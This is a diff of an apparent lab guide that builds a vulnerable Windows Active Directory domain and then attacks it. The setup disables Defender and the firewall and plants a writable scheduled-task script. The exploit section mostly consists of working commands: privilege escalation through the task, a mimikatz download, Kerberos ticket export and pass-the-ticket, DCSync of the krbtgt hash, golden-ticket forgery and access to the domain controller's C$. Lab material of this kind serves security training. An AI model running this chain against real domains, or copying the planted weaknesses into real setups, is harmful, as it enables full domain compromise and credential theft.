@@ -1,3 +1,4 @@
+## Enviorment ##
 Domain:
 goldencheezburger.com
 
@@ -36,74 +37,96 @@ Scenario:
 5) Issue ticket for Administrator
 6) Brows fileshare on golden-dc-01
 
-Deploy domain:
+## Deploy domain ##
+#Install domain services
 Add-WindowsFeature AD-Domain-Services
 
-Install-ADDSForest `
--DomainName "goldencheezburger.com" `
--CreateDnsDelegation:$false `
--DatabasePath "C:\Windows\NTDS" `
--DomainMode "7" `
--DomainNetbiosName "goldencheez" `
--ForestMode "7" `
--InstallDns:$true `
--LogPath "C:\Windows\NTDS" `
--NoRebootOnCompletion:$True `
--SysvolPath "C:\Windows\SYSVOL" `
--Force:$true
+#Install forest
+Install-ADDSForest
+-DomainName "goldencheezburger.com" -CreateDnsDelegation:$false -DatabasePath "C:\Windows\NTDS" -DomainMode "7" -DomainNetbiosName "goldencheez" -ForestMode "7" -InstallDns:$true -LogPath "C:\Windows\NTDS" -NoRebootOnCompletion:$True -SysvolPath "C:\Windows\SYSVOL" -Force:$true
 
+#Check services
 Get-Service adws,kdc,netlogon,dns
 
+#Add users account to domain
 New-ADUser -Name "admin" -PasswordNeverExpires $true  -AccountPassword (ConvertTo-SecureString -AsPlainText -String '****' -Force)
 New-ADUser -Name "user" -PasswordNeverExpires $true -AccountPassword (ConvertTo-SecureString -AsPlainText -String '****' -Force)
+
+#Add user account to group
 Add-ADGroupMember -Identity "Domain Admins" -Members admin
+
+#Add computer account to domain
 New-ADComputer -Name "golden-cl-01" -SamAccountName "golden-cl-01"
+
+#Disable Windows Defender and Firewall
 Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
 
-Deploy client:
+## Deploy client ##
+#Add client to domain
 Add-computer –domainname "goldencheezburger.com" -restart
 
-## Restart ##
-
+#Set execution policy for client
 Set-ExecutionPolicy unrestricted -Scope LocalMachine
 
+#Create folder and ps1 file
 New-Item -Path 'C:\temp' -ItemType Directory
 New-Item -Path 'C:\temp\cheez.ps1' -ItemType File
 
+#Set Acl on folder
+$acl = Get-Acl "c:\temp"
+$ar = New-Object System.Security.AccessControl.FileSystemAccessRule("user", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
+
+$acl.SetAccessRule($ar)
+Set-Acl "c:\temp" $acl
+
+#Create schedueld task
 $action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument '-NoProfile -WindowStyle Hidden -command "c:\temp\cheez.ps1"'
 $trigger = New-ScheduledTaskTrigger -Once -At 7am -RepetitionDuration (New-TimeSpan -Days 1) -RepetitionInterval (New-TimeSpan -Minutes 1)
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Cheez" -Description "Cheez burger delivery" -User "$env:USERDOMAIN\$env:USERNAME" -Password '*****'
 
+#Allow Domain Users to access client via RDP
 Add-LocalGroupMember -Group "Remote Desktop Users" "goldencheez\Domain Users"
 
+#Disable Windows Defender and Firewall
 Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
 
-Exploite:
+## Exploite ##
 
+#Logon as admin via RDP
+#Logon as user via RDP
+#Exeute below as user
 Add to cheez.ps1
 New-LocalUser "cheez" -Password (ConvertTo-SecureString -AsPlainText -String 'Sommar2021!' -Force)
 Add-LocalGroupMember -Group "Administrators" -Member "cheez"
 
-Logon as cheez
+#Logon as cheez (Exeute below as cheez)
 runas /user:cheez powershell.exe
 
-Download mimikatz
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+#Download mimikatz
+#[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "mimikatz_trunk.zip"
 
-Dump tickets for admin
+#Dump tickets for admin
 privilege::debug
 sekurlsa::tickets /export
 kerberos::ptt [0;xxx]xxxxx.kirbi
 
+#Grab domain sid and NTLM hash for krbtgt
 lsadump::dcsync /domain:goldencheezburger.com /all /user:krbtgt
 Kerberos::golden /user:Administrator /domain:goldencheezburger.com /sid:[domain_sid] /krbtgt:[ntlm_hash] /id:500 
 misc::cmd
+
+#List tickets
 klist
+
+#check current user
 whoami
+
+#browse dc c$
 dir \\golden-dc-01\c$
 
+#Install powershell remote tools
 Get-WindowsFeature –Name RSAT*
 ADD-WindowsFeature RSAT-Role-Tools
